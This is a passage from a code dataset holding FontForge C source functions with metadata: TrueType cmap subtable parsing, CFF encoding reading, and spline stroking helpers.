specific==1) ||\n\t\t(platform==0 && specific==3))\n\t    unicode_cmap = i;\n    }\n\n    if ( justinuse==git_justinuse || !ask_user_for_cmap || (i = PickCMap(cmap_encs,usable_encs,def))==-1 )\n\ti = def;\n\n    if ( i==-1 ) {\n\tif ( justinuse==git_normal )\n\t    LogError( _(\"Could not find a usable encoding table\" ));\n\tfree(cmap_encs);\nreturn;\n    }\n\n    info->platform = cmap_encs[i].platform;\n    info->specific = cmap_encs[i].specific;\n\n    desired_cmaps[0] = cmap_encs[i]; dcnt = 1;\n    if ( unicode4_cmap!=-1 ) {\n\tif ( i!=unicode4_cmap ) {\n\t    desired_cmaps[1] = cmap_encs[unicode4_cmap];\n\t    ++dcnt;\n\t}\n    } else if ( unicode_cmap!=-1 ) {\n\tif ( i!=unicode_cmap ) {\n\t    desired_cmaps[1] = cmap_encs[unicode_cmap];\n\t    ++dcnt;\n\t}\n    } else {\n\tif ( i!=def && def!=-1 ) {\n\t    desired_cmaps[1] = cmap_encs[def];\n\t    ++dcnt;\n\t}\n    }\n\n    map = NULL;\n    if ( justinuse==git_justinuse ) {\n\tdcmap_cnt = usable_encs;\n\tdcmap = cmap_encs;\n    } else {\n\tdcmap_cnt = dcnt;\n\tdcmap = desired_cmaps;\n    }\n    for ( dc=dcmap_cnt-1; dc>=0; --dc ) {\n\t/* if justinuse then look at all cmaps and tick the glyphs they use */\n\t/* otherwise dcmap_cnt will be either 1 or 2. If 1 then this subtable */\n\t/* contains both the encoding and the source for unicode encodings */\n\t/* if dcmap_cnt==2 then when dc==0 we are setting up the encoding */\n\t/*  and when dc==1 we are setting up the unicode code points */\n\tint dounicode = (dc==dcmap_cnt-1);\n\tenc = dcmap[dc].enc;\n\tencoff = dcmap[dc].offset;\n\n\tmod = 0;\n\tif ( dcmap[dc].platform==3 && (dcmap[dc].specific>=2 && dcmap[dc].specific<=6 ))\n\t    mod = dcmap[dc].specific;\n\telse if ( dcmap[dc].platform==1 && (dcmap[dc].specific==2 ||dcmap[dc].specific==1||dcmap[dc].specific==3||dcmap[dc].specific==25))\n\t    mod = dcmap[dc].specific==1?2:dcmap[dc].specific==2?4:dcmap[dc].specific==3?5:3;\t\t/* convert to ms specific */\n\tif ( dc==0 && justinuse==git_normal ) {\n\t    interp = interp_from_encoding(enc,ui_none);\n\t    info->map = map = EncMapNew(enc->char_cnt,info->glyph_cnt,enc);\n\t    info->uni_interp = interp;\n\t}\n\n\tfseek(ttf,info->encoding_start+encoff,SEEK_SET);\n\tformat = getushort(ttf);\n\tif ( format!=12 && format!=10 && format!=8 ) {\n\t    len = getushort(ttf);\n\t    /* version/language = */ getushort(ttf);\n\t} else {\n\t    /* padding */ getushort(ttf);\n\t    len = getlong(ttf);\n\t    /* language = */ getlong(ttf);\n\t}\n\tif ( enc->is_unicodebmp && (format==8 || format==10 || format==12))\n\t    enc = FindOrMakeEncoding(\"UnicodeFull\");\n\n\tif ( format==0 ) {\n\t    if (len > 256 + 6) {\n\t\tIError(\"Table too large; truncated to 256 entries.\");\n\t    }\n\t    if ( justinuse==git_normal && map!=NULL && map->enccount<256 ) {\n\t\tmap->map = realloc(map->map,256*sizeof(int));\n\t\tmemset(map->map+map->enccount,-1,(256-map->enccount)*sizeof(int));\n\t\tmap->enccount = map->encmax = 256;\n\t    }\n\t    for ( i=0; i<len-6; ++i )\n\t\tif (i < 256) table[i] = getc(ttf); else getc(ttf);\n\t    trans = enc->unicode;\n\t    if ( trans==NULL && dcmap[dc].platform==1 )\n\t\ttrans = MacEncToUnicode(dcmap[dc].specific,dcmap[dc].lang-1);\n\t    for ( i=0; i<256 && i<len-6; ++i )\n\t\tif ( justinuse==git_normal ) {\n\t\t    if ( table[i]<info->glyph_cnt && info->chars[table[i]]!=NULL ) {\n\t\t\tif ( map!=NULL )\n\t\t\t    map->map[i] = table[i];\n\t\t\tif ( dounicode && trans!=NULL )\n\t\t\t    info->chars[table[i]]->unicodeenc = trans[i];\n\t\t    }\n\t\t} else if ( table[i]<info->glyph_cnt && info->chars[table[i]]!=NULL )\n\t\t    info->inuse[table[i]] = 1;\n\t} else if ( format==4 ) {\n\t    int rlen = len;\n\t    segCount = getushort(ttf)/2;\n\t    /* searchRange = */ getushort(ttf);\n\t    /* entrySelector = */ getushort(ttf);\n\t    /* rangeShift = */ getushort(ttf);\n\t    endchars = malloc(segCount*sizeof(uint16));\n\t    used = calloc(65536,sizeof(uint8));\n\t    for ( i=0; i<segCount; ++i )\n\t\tendchars[i] = getushort(ttf);\n\t    if ( getushort(ttf)!=0 )\n\t\tIError(\"Expected 0 in 'cmap' format 4 subtable\");\n\t    startchars = malloc(segCount*sizeof(uint16));\n\t    for ( i=0; i<segCount; ++i )\n\t\tstartchars[i] = getushort(ttf);\n\t    delta = malloc(segCount*sizeof(uint16));\n\t    for ( i=0; i<segCount; ++i )\n\t\tdelta[i] = getushort(ttf);\n\t    rangeOffset = malloc(segCount*sizeof(uint16));\n\t    for ( i=0; i<segCount; ++i )\n\t\trangeOffset[i] = getushort(ttf);\n\t    len -= 8*sizeof(uint16) +\n\t\t    4*segCount*sizeof(uint16);\n\t    /* that's the amount of space left in the subtable and it must */\n\t    /*  be filled with glyphIDs */\n\t    if ( len<0 ) {\n\t\tIError(\"This font has an illegal format 4 subtable with too little space for all the segments (%d).\\nThis error is not recoverable.\\nBye\", rlen);\n\t\t// exit(1);\n\t\t// Exiting abruptly is not a desirable behavior.\n\t\t// Even if continuing to load would result in a totally broken font,\n\t\t// that is still better than closing completely.\n\t\tlen = 0;\n\t    }\n\t    glyphs = malloc(len);\n\t    glyph_tot = len/2;\n\t    for ( i=0; i<glyph_tot; ++i )\n\t\tglyphs[i] = getushort(ttf);\n\t    for ( i=0; i<segCount; ++i ) {\n\t\tif ( rangeOffset[i]==0 && startchars[i]==0xffff )\n\t\t    /* Done */;\n\t\telse if ( rangeOffset[i]==0 ) {\n\t\t    for ( j=startchars[i]; j<=endchars[i]; ++j ) {\n\t\t\tif ( justinuse==git_justinuse && (uint16) (j+delta[i])<info->glyph_cnt )\n\t\t\t    info->inuse[(uint16) (j+delta[i])] = true;\n\t\t\telse if ( (uint16) (j+delta[i])>=info->glyph_cnt || info->chars[(uint16) (j+delta[i])]==NULL ) {\n\t\t\t    LogError( _(\"Attempt to encode missing glyph %d to %d (0x%x)\\n\"),\n\t\t\t\t    (uint16) (j+delta[i]), modenc(j,mod), modenc(j,mod));\n\t\t\t    info->bad_cmap = true;\n\t\t\t} else {\n\t\t\t    int uenc = umodenc(j,mod,info);\n\t\t\t    int lenc = modenc(j,mod);\n\t\t\t    if ( uenc!=-1 && used[uenc] ) {\n\t\t\t\tif ( !badencwarned ) {\n\t\t\t\t    LogError( _(\"Multiple glyphs map to the same unicode encoding U+%04X, only one will be used\\n\"), uenc );\n\t\t\t            info->bad_cmap = true;\n\t\t\t            badencwarned = true;\n\t\t\t\t}\n\t\t\t    } else {\n\t\t\t\tif ( uenc!=-1 && dounicode ) used[uenc] = true;\n\t\t\t\tif ( dounicode && info->chars[(uint16) (j+delta[i])]->unicodeenc==-1 )\n\t\t\t\t    info->chars[(uint16) (j+delta[i])]->unicodeenc = uenc;\n\t\t\t        if ( map!=NULL && lenc<map->enccount )\n\t\t\t\t    map->map[lenc] = (uint16) (j+delta[i]);\n\t\t\t    }\n\t\t\t}\n\t\t    }\n\t\t} else if ( rangeOffset[i]!=0xffff ) {\n\t\t    /* Apple says a rangeOffset of 0xffff means no glyph */\n\t\t    /*  OpenType doesn't mention this */\n\t\t    for ( j=startchars[i]; j<=endchars[i]; ++j ) {\n\t\t\tint temp = (i-segCount+rangeOffset[i]/2) + j-startchars[i];\n\t\t\tif ( temp<glyph_tot )\n\t\t\t    index = glyphs[ temp ];\n\t\t\telse {\n\t\t\t    /* This happened in mingliu.ttc(PMingLiU) */\n\t\t\t    if ( justinuse==git_normal ) {\n\t\t\t\tLogError( _(\"Glyph index out of bounds. Was %d, must be less than %d.\\n In attempt to associate a glyph with encoding %x in segment %d\\n with platform=%d, specific=%d (in 'cmap')\\n\"),\n\t\t\t\t\ttemp, glyph_tot, j, i, dcmap[dc].platform, dcmap[dc].specific );\n\t\t\t\tinfo->bad_cmap = true;\n\t\t\t    }\n\t\t\t    index = 0;\n\t\t\t}\n\t\t\tif ( index!=0 ) {\n\t\t\t    index = (unsigned short) (index+delta[i]);\n\t\t\t    if ( index>=info->glyph_cnt ) {\n\t\t\t\t/* This isn't mentioned either, but in some */\n\t\t\t        /*  MS Chinese fonts (kaiu.ttf) the index */\n\t\t\t        /*  goes out of bounds. and MS's ttf dump */\n\t\t\t        /*  program says it is treated as 0 */\n\t\t\t\tLogError( _(\"Attempt to encode missing glyph %d to %d (0x%x)\\n\"),\n\t\t\t\t\tindex, modenc(j,mod), modenc(j,mod));\n\t\t\t\tinfo->bad_cmap = true;\n\t\t\t    } else if ( justinuse==git_justinuse )\n\t\t\t\tinfo->inuse[index] = 1;\n\t\t\t    else if ( info->chars[index]==NULL ) {\n\t\t\t\tLogError( _(\"Attempt to encode missing glyph %d to %d (0x%x)\\n\"),\n\t\t\t\t\tindex, modenc(j,mod), modenc(j,mod));\n\t\t\t\tinfo->bad_cmap = true;\n\t\t\t    } else {\n\t\t\t\tint uenc = umodenc(j,mod,info);\n\t\t\t\tint lenc = modenc(j,mod);\n\t\t\t\tif ( uenc!=-1 && used[uenc] ) {\n\t\t\t\t    if ( !badencwarned ) {\n\t\t\t\t\tLogError( _(\"Multiple glyphs map to the same unicode encoding U+%04X, only one will be used\\n\"), uenc );\n\t\t\t                info->bad_cmap = true;\n\t\t\t\t\tbadencwarned = true;\n\t\t\t\t    }\n\t\t\t\t} else {\n\t\t\t\t    if ( uenc!=-1 && dounicode ) used[uenc] = true;\n\t\t\t\t    if ( dounicode && info->chars[index]->unicodeenc==-1 )\n\t\t\t\t\tinfo->chars[index]->unicodeenc = uenc;\n\t\t\t\t    if ( map!=NULL && lenc<map->enccount )\n\t\t\t\t\tmap->map[lenc] = index;\n\t\t\t\t}\n\t\t\t    }\n\t\t\t}\n\t\t    }\n\t\t} else {\n\t\t    LogError( _(\"Use of a range offset of 0xffff to mean a missing glyph in cmap table\\n\") );\n\t\t    info->bad_cmap = true;\n\t\t}\n\t    }\n\t    free(glyphs);\n\t    free(rangeOffset);\n\t    free(delta);\n\t    free(startchars);\n\t    free(endchars);\n\t    free(used);\n\t} else if ( format==6 ) {\n\t    /* trimmed array format */\n\t    /* Well, the docs say it's for 2byte encodings, but Apple actually*/\n\t    /*  uses it for 1 byte encodings which don't fit into the require-*/\n\t    /*  ments for a format 0 sub-table. See Zapfino.dfont */\n\t    int first, count;\n\t    first = getushort(ttf);\n\t    count = getushort(ttf);\n\t    trans = enc->unicode;\n\t    if ( trans==NULL && dcmap[dc].platform==1 && first+count<=256 )\n\t\ttrans = MacEncToUnicode(dcmap[dc].specific,dcmap[dc].lang-1);\n\t    if ( justinuse==git_justinuse )\n\t\tfor ( i=0; i<count; ++i )\n\t\t    info->inuse[getushort(ttf)]= 1;\n\t    else {\n\t\tfor ( i=0; i<count; ++i ) {\n\t\t    int gid = getushort(ttf);\n\t\t    if ( dounicode ) {\n\t\t\tif ( gid<info->glyph_cnt ) {\n\t\t\t    info->chars[gid]->unicodeenc = trans!=NULL ? trans[first+i] : first+i;\n\t\t\t    if ( map!=NULL && first+i < map->enccount )\n\t\t\t\tmap->map[first+i] = gid;\n\t\t\t} else\n\t\t\t    LogError( _(\"Warning: gid %d larger than glyph_cnt %d, skipping\\n\"), gid, info->glyph_cnt);\n\t\t    }\n\t\t}\n\t    }\n\t} else if ( format==2 ) {\n\t    int max_sub_head_key = 0, cnt, max_pos= -1;\n\t    struct subhead *subheads;\n\t    \n\t    for ( i=0; i<256; ++i ) {\n\t\ttable[i] = getushort(ttf)/8;\t/* Sub-header keys */\n\t\tif ( table[i]>max_sub_head_key ) {\n\t\t    max_sub_head_key = table[i];\t/* The entry is a byte pointer, I want a pointer in units of struct subheader */\n\t\t    max_pos = i;\n\t\t}\n\t    }\n\t    subheads = malloc((max_sub_head_key+1)*sizeof(struct subhead));\n\t    for ( i=0; i<=max_sub_head_key; ++i ) {\n\t\tsubheads[i].first = getushort(ttf);\n\t\tsubheads[i].cnt = getushort(ttf);\n\t\tsubheads[i].delta = getushort(ttf);\n\t\tsubheads[i].rangeoff = (getushort(ttf)-\n\t\t\t\t(max_sub_head_key-i)*sizeof(struct subhead)-\n\t\t\t\tsizeof(short))/sizeof(short);\n\t    }\n\t    cnt = (len-(ftell(ttf)-(info->encoding_start+encoff)))/sizeof(short);\n\t    /* The count is the number of glyph indexes to read. it is the */\n\t    /*  length of the entire subtable minus that bit we've read so far */\n\t    glyphs = malloc(cnt*sizeof(uint16));\n\t    for ( i=0; i<cnt; ++i )\n\t\tglyphs[i] = getushort(ttf);\n\t    last = -1;\n\t    for ( i=0; i<256; ++i ) {\n\t\tif ( table[i]==0 ) {\n\t\t    /* Special case, single byte encoding entry, look it up in */\n\t\t    /*  subhead */\n\t\t    /* In the one example I've got of this encoding (wcl-02.ttf) the chars */\n\t\t    /* 0xfd, 0xfe, 0xff are said to exist but there is no mapping */\n\t\t    /* for them. */\n\t\t    if ( i>=max_pos )\n\t\t\tindex = 0;\t/* the subhead says there are 256 entries, but in fact there are only 193, so attempting to find these guys should give an error */\n\t\t    else if ( i<subheads[0].first || i>=subheads[0].first+subheads[0].cnt ||\n\t\t\t    subheads[0].rangeoff+(i-subheads[0].first)>=cnt )\n\t\t\tindex = 0;\n\t\t    else if ( (index = glyphs[subheads[0].rangeoff+(i-subheads[0].first)])!= 0 )\n\t\t\tindex = (uint32) (index+subheads[0].delta);\n\t\t    /* I assume the single byte codes are just ascii or latin1*/\n\t\t    if ( index!=0 && index<info->glyph_cnt ) {\n\t\t\tif ( justinuse==git_justinuse )\n\t\t\t    info->inuse[index] = 1;\n\t\t\telse if ( info->chars[index]==NULL )\n\t\t\t    /* Do Nothing */;\n\t\t\telse {\n\t\t\t    int lenc = modenc(i,mod);\n\t\t\t    if ( dounicode && info->chars[index]->unicodeenc==-1 )\n\t\t\t\tinfo->chars[index]->unicodeenc = i;\n\t\t\t    if ( map!=NULL && lenc<map->enccount )\n\t\t\t\tmap->map[lenc] = index;\n\t\t\t}\n\t\t    }\n\t\t} else {\n\t\t    int k = table[i];\n\t\t    for ( j=0; j<subheads[k].cnt; ++j ) {\n\t\t\tint enc, lenc;\n\t\t\tif ( subheads[k].rangeoff+j>=cnt )\n\t\t\t    index = 0;\n\t\t\telse if ( (index = glyphs[subheads[k].rangeoff+j])!= 0 )\n\t\t\t    index = (uint16) (index+subheads[k].delta);\n\t\t\tif ( index!=0 && index<info->glyph_cnt ) {\n\t\t\t    enc = (i<<8)|(j+subheads[k].first);\n\t\t\t    lenc = modenc(enc,mod);\n\t\t\t    if ( justinuse==git_justinuse )\n\t\t\t\tinfo->inuse[index] = 1;\n\t\t\t    else if ( info->chars[index]==NULL )\n\t\t\t\t/* Do Nothing */;\n\t\t\t    else {\n\t\t\t\tif ( dounicode && info->chars[index]->unicodeenc==-1 )\n\t\t\t\t    info->chars[index]->unicodeenc = umodenc(enc,mod,info);\n\t\t\t\tif ( map!=NULL && lenc<map->enccount )\n\t\t\t\t    map->map[lenc] = index;\n\t\t\t    }\n\t\t\t}\n\t\t    }\n\t\t    /*if ( last==-1 ) last = i;*/\n\t\t}\n\t    }\n\t    free(subheads);\n\t    free(glyphs);\n\t} else if ( format==8 ) {\n\t    uint32 ngroups, start, end, startglyph;\n\t    if ( !enc->is_unicodefull ) {\n\t\tIError(\"I don't support 32 bit characters except for the UCS-4 (MS platform, specific=10)\" );\n\t\tenc = FindOrMakeEncoding(\"UnicodeFull\");\n\t    }\n\t    /* I'm now assuming unicode surrogate encoding, so I just ignore */\n\t    /*  the is32 table (it will be set for the surrogates and not for */\n\t    /*  anything else */\n\t    fseek(ttf,8192,SEEK_CUR);\n\t    ngroups = getlong(ttf);\n\t    for ( j=0; j<ngroups; ++j ) {\n\t\tstart = getlong(ttf);\n\t\tend = getlong(ttf);\n\t\tstartglyph = getlong(ttf);\n\t\tif ( justinuse==git_justinuse )\n\t\t    for ( i=start; i<=end; ++i )\n\t\t\tinfo->inuse[startglyph+i-start]= 1;\n\t\telse\n\t\t    for ( i=start; i<=end; ++i ) {\n\t\t\tint uenc = ((i>>16)-0xd800)*0x400 + (i&0xffff)-0xdc00 + 0x10000;\n\t\t\tsc = info->chars[startglyph+i-start];\n\t\t\tif ( dounicode && sc->unicodeenc==-1 )\n\t\t\t    sc->unicodeenc = uenc;\n\t\t\tif ( map!=NULL && sc->unicodeenc < map->enccount )\n\t\t\t    map->map[uenc] = startglyph+i-start;\n\t\t    }\n\t    }\n\t} else if ( format==10 ) {\n\t    /* same as format 6, except for 4byte chars */\n\t    int first, count;\n\t    if ( !enc->is_unicodefull ) {\n\t\tIError(\"I don't support 32 bit characters except for the UCS-4 (MS platform, specific=10)\" );\n\t\tenc = FindOrMakeEncoding(\"UnicodeFull\");\n\t    }\n\t    first = getlong(ttf);\n\t    count = getlong(ttf);\n\t    if ( justinuse==git_justinuse )\n\t\tfor ( i=0; i<count; ++i )\n\t\t    info->inuse[getushort(ttf)]= 1;\n\t    else\n\t\tfor ( i=0; i<count; ++i ) {\n\t\t    int gid = getushort(ttf);\n\t\t    if ( dounicode )\n\t\t\tinfo->chars[gid]->unicodeenc = first+i;\n\t\t    if ( map!=NULL && first+i < map->enccount )\n\t\t\tmap->map[first+i] = gid;\n\t\t}\n\t} else if ( format==12 ) {\n\t    uint32 ngroups, start, end, startglyph;\n\t    if ( !enc->is_unicodefull ) {\n\t\tIError(\"I don't support 32 bit characters except for the UCS-4 (MS platform, specific=10)\" );\n\t\tenc = FindOrMakeEncoding(\"UnicodeFull\");\n\t    }\n\t    ngroups = getlong(ttf);\n\t    for ( j=0; j<ngroups; ++j ) {\n\t\tstart = getlong(ttf);\n\t\tend = getlong(ttf);\n\t\tstartglyph = getlong(ttf);\n\t\tif ( justinuse==git_justinuse ) {\n\t\t    for ( i=start; i<=end; ++i )\n\t\t\tif ( startglyph+i-start < info->glyph_cnt )\n\t\t\t    info->inuse[startglyph+i-start]= 1;\n\t\t\telse\n\t\t    break;\n\t\t} else\n\t\t    for ( i=start; i<=end; ++i ) {\n\t\t\tif ( startglyph+i-start >= info->glyph_cnt ||\n\t\t\t\tinfo->chars[startglyph+i-start]==NULL ) {\n\t\t\t    LogError( _(\"Bad font: Encoding data out of range.\\n\") );\n\t\t\t    info->bad_cmap = true;\n\t\t    break;\n\t\t\t} else {\n\t\t\t    if ( dounicode )\n\t\t\t\tinfo->chars[startglyph+i-start]->unicodeenc = i;\n\t\t\t    if ( map!=NULL && i < map->enccount )\n\t\t\t\tmap->map[i] = startglyph+i-start;\n\t\t\t}\n\t\t    }\n\t    }\n\t}\n    }\n    free(cmap_encs);\n    if ( info->chars!=NULL )\n\tfor ( i=0; i<info->glyph_cnt; ++i )\n\t    if ( info->chars[i]!=NULL && info->chars[i]->unicodeenc==0xffff )\n\t\tinfo->chars[i]->unicodeenc = -1;\n    info->vs_start = vs_map;\n    if ( vs_map!=0 )\n\tApplyVariationSequenceSubtable(ttf,vs_map,info,justinuse);\n    if ( justinuse==git_normal ) {\n\tif ( interp==ui_none )\n\t    info->uni_interp = amscheck(info,map);\n\tmap->enc = enc;\t\t/* This can be changed from the initial value */\n    }\n    info->map = map;\n}", "path": "fontforge/fontforge/parsettf.c", "commit_date": "2020-03-05 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* I really expect to deal with encodings in ttf cmap, but ocasionally we */\n/*  get a bare cff */\n", "func_signal": "static void readcffenc(FILE *ttf,struct topdicts *dict,struct ttfinfo *info,\n\tchar **strings, int scnt)", "code": "{\n    int format, cnt, i, j, pos, first, last, dupenc, sid;\n    const char *name;\n    EncMap *map;\n\n    if ( info->encoding_start!=0 )\t\t/* Use the cmap instead */\nreturn;\n    if ( info->subfontcnt!=0 )\nreturn;\t\t\t\t\t\t/* Use cids instead */\n\n    for ( i=0; i<info->glyph_cnt; ++i ) {\n\tif ( info->chars[i]->unicodeenc==-1 )\n\t    info->chars[i]->unicodeenc = UniFromName(info->chars[i]->name,ui_none,&custom);\n    }\n\n    map = EncMapNew(256,256,&custom);\n    if ( dict->encodingoff==0 || dict->encodingoff==1 ) {\n\t/* Standard Encodings */\n\tchar **enc = dict->encodingoff==0 ? (char **)AdobeStandardEncoding : (char **)AdobeExpertEncoding;\n\tmap->enc = FindOrMakeEncoding( dict->encodingoff==0 ?\n\t\t\"AdobeStandard\" : \"Custom\" );\n\tif ( map->enc==NULL )\n\t    map->enc = &custom;\n\tfor ( i=0; i<info->glyph_cnt; ++i ) {\n\t    for ( pos=0; pos<256; ++pos )\n\t\tif ( strcmp(info->chars[i]->name,enc[pos])==0 )\n\t    break;\n\t    if ( pos<256 )\n\t\tmap->map[pos] = i;\n\t}\n    } else {\n\tfseek(ttf,dict->cff_start+dict->encodingoff,SEEK_SET);\n\tformat = getc(ttf);\n        /* Mask off high (additional encoding bit) and check format type */\n\tif ( (format&0x7f)==0 ) {\n            /* format 0 is a 1-1 map of glyph_id to code, starting with id 1 */\n\t    cnt = getc(ttf);\n\t    for ( i=1; i<=cnt && i<info->glyph_cnt; ++i )\n\t\tmap->map[getc(ttf)] = i;\n\t} else if ( (format&0x7f)==1 ) {\n\t    cnt = getc(ttf);\n            /* CFF encodings start with glyph_id 1 since 0 is always .notdef */\n\t    pos = 1;\n            /* Parse format 1 code ranges */\n\t    for ( i=0; i<cnt ; ++i ) {\n                /* next byte is code of first character in range */\n\t\tfirst = getc(ttf);\n                /* next byte is the number of additional characters in range */\n\t\tlast = first + getc(ttf);\n\t\twhile ( first<=last && first<256 ) {\n\t\t    if ( pos<info->glyph_cnt )\n\t\t\tmap->map[first] = pos;\n\t\t    ++pos;\n\t\t    ++first;\n\t\t}\n\t    }\n\t} else {\n\t    LogError( _(\"Unexpected encoding format in cff: %d\\n\"), format );\n\t    if ( info!=NULL ) info->bad_cff = true;\n\t}\n        /* if additional encoding bit set, add all additional encodings */\n\tif ( format&0x80 ) {\n\t    cnt = getc(ttf);\n\t    for ( i=0; i<cnt; ++i ) {\n\t\tdupenc = getc(ttf);\n\t\tsid = getushort(ttf);\n\t\tname = getstrid(sid,strings,scnt,info);\n\t\tif ( name==NULL )\t/* Table is erroneous */\n\t    break;\n\t\tfor ( j=0; j<info->glyph_cnt; ++j )\n\t\t    if ( strcmp(name,info->chars[j]->name)==0 )\n\t\tbreak;\n\t\tif ( j!=info->glyph_cnt )\n\t\t    map->map[dupenc] = j;\n\t    }\n\t}\n    }\n    info->map = map;\n}", "path": "fontforge/fontforge/parsettf.c", "commit_date": "2020-03-05 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* This is a convenience function that also concisely demonstrates\n * the calculation of an offseted point.\n */\n", "func_signal": "BasePoint SplineOffsetAt(StrokeContext *c, Spline *s, bigreal t, int is_right)", "code": "{\n    int is_ccw;\n    BasePoint xy, ut;\n    NibOffset no;\n\n    // The coordinate of the spline at t\n    xy = SPLINEPVAL(s, t);\n    // The turning direction of the spline at t\n    is_ccw = SplineTurningCCWAt(s, t);\n    // The tangent angle of the spline at t\n    ut = SplineUTanVecAt(s, t);\n\n    // The offsets of the nib tracing at that angle (where is_right\n    // reverses the angle and therefore the side of the nib)\n    CalcNibOffset(c, ut, is_right, &no, -1);\n\n    // (The spline coordinate at t) + (the offset). If the angle is on a\n    // nib line, use the turning direction to pick the corner that will be\n    // continuous with the next points to be drawn based on the turning\n    // direction (and therefore the next angle).\n    return BPAdd(xy, no.off[is_ccw]);\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/******************************************************************************/\n/* ******************************* Higher-Level ***************************** */\n/******************************************************************************/\n", "func_signal": "static SplinePointList *SinglePointStroke(SplinePoint *sp,\n                                          struct strokecontext *c)", "code": "{\n    SplineSet *ret;\n    real trans[6];\n\n    if ( c->nibtype==nib_ellip && c->cap==lc_butt ) {\n\t// Leave as a single point\n\tret = chunkalloc(sizeof(SplineSet));\n\tret->first = ret->last = SplinePointCreate(sp->me.x,sp->me.y);\n\tret->first->pointtype = pt_corner;\n    } else {\n\t // Draw a nib\n\tmemset(&trans, 0, sizeof(trans));\n\ttrans[0] = trans[3] = 1;\n\ttrans[4] = sp->me.x;\n\ttrans[5] = sp->me.y;\n\tret = SplinePointListCopy(c->nib);\n\tSplinePointListTransformExtended(ret, trans, tpt_AllPoints,\n\t                                 tpmask_dontTrimValues);\n    }\n    return( ret );\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/******************************************************************************/\n/* *********************** Tracing, Caps and Joins ************************** */\n/******************************************************************************/\n", "func_signal": "static SplinePoint *AddNibPortion(NibCorner *nc, SplinePoint *tailp,\n                                  NibOffset *no_fm, int is_ccw_fm,\n\t\t\t\t  NibOffset *no_to, int is_ccw_to, int bk)", "code": "{\n    SplinePoint *sp, *nibp_fm, *nibp_to;\n\n    nibp_fm = nc[no_fm->nci[is_ccw_fm]].on_nib;\n    nibp_to = nc[no_to->nci[is_ccw_to]].on_nib;\n    sp = AppendCubicSplineSetPortion(nibp_fm->next, no_fm->nt, nibp_to->next,\n                                     no_to->nt, tailp, bk);\n    return sp;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Put the new endpoint exactly where the NibOffset calculation says it\n * should be to avoid cumulative append errors.\n */\n", "func_signal": "static int SplineStrokeAppendFixup(SplinePoint *tailp, BasePoint sxy,\n                                   NibOffset *no, int is_ccw, bigreal fudge)", "code": "{\n    bigreal mg, mg2;\n    BasePoint oxy, oxy2, dxy, dxy2;\n\n    if ( is_ccw==-1 ) {\n\toxy  = SplineStrokeVerifyCorner(sxy, tailp->me, no, 0, &dxy, &mg);\n\toxy2 = SplineStrokeVerifyCorner(sxy, tailp->me, no, 1, &dxy2, &mg2);\n\tif ( mg2<mg ) {\n\t    mg = mg2;\n\t    oxy = oxy2;\n\t    dxy = dxy2;\n\t    is_ccw = 1;\n\t} else\n\t    is_ccw = 0;\n    } else\n\toxy = SplineStrokeVerifyCorner(sxy, tailp->me, no, is_ccw, &dxy, &mg);\n\n    // assert( mg < 1 );\n    if ( mg > FIXUP_MARGIN*fudge ) {\n\tLogError(_(\"Warning: Coordinate diff %lf greater than margin %lf\\n\"),\n\t         mg, FIXUP_MARGIN*fudge);\n    }\n\n    tailp->prevcp = BPAdd(tailp->prevcp, dxy);\n    tailp->me = oxy;\n    SplineRefigure(tailp->prev);\n    return is_ccw;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
{"docstring": "/* Copies the splines between spline_fm (at t_fm) and spline_to (at t_to)\n * after point tailp. \"backward\" (and therefore forward) is relative\n * to next/prev rather than clockwise/counter-clockwise.\n */\n", "func_signal": "SplinePoint *AppendCubicSplineSetPortion(Spline *spline_fm, bigreal t_fm,\n                                         Spline *spline_to, bigreal t_to,\n\t\t\t\t\t SplinePoint *tailp, int backward)", "code": "{\n    Spline *s;\n\n    if (    backward && RealWithin(t_fm, 0.0, 1e-4)\n         && spline_fm!=spline_to ) {\n\tt_fm = 1;\n\tspline_fm = spline_fm->from->prev;\n    } else if (    !backward && RealWithin(t_fm, 1.0, 1e-4)\n                && spline_fm != spline_to ) {\n\tt_fm = 0;\n\tspline_fm = spline_fm->to->next;\n    }\n    if (    backward && RealWithin(t_to, 1.0, 1e-4)\n         && spline_fm != spline_to ) {\n\tt_to = 0.0;\n\tspline_to = spline_to->to->next;\n    } else if (    !backward && RealWithin(t_to, 0.0, 1e-4)\n                && spline_fm != spline_to ) {\n\tt_to = 1.0;\n\tspline_to = spline_to->from->prev;\n    }\n    s = spline_fm;\n\n    // Handle the single spline case\n    if (    s==spline_to\n         && (( t_fm<=t_to && !backward ) || (t_fm>=t_to && backward))) {\n\ttailp = AppendCubicSplinePortion(s, t_fm, t_to, tailp);\n\treturn tailp;\n    }\n\n    tailp = AppendCubicSplinePortion(s, t_fm, backward ? 0 : 1, tailp);\n\n    while ( 1 ) {\n        s = backward ? s->from->prev : s->to->next;\n\tif ( s==spline_to )\n\t    break;\n\tassert( s!=NULL && s!=spline_fm ); // XXX turn into runtime warning?\n        tailp = AppendCubicSplinePortion(s, backward ? 1 : 0,\n\t                                  backward ? 0 : 1, tailp);\n    }\n    tailp = AppendCubicSplinePortion(s, backward ? 1 : 0, t_to, tailp);\n    return tailp;\n}", "path": "fontforge/fontforge/splinestroke.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "fontforge/fontforge", "stars": 5923, "license": "other", "language": "c", "size": 105879}
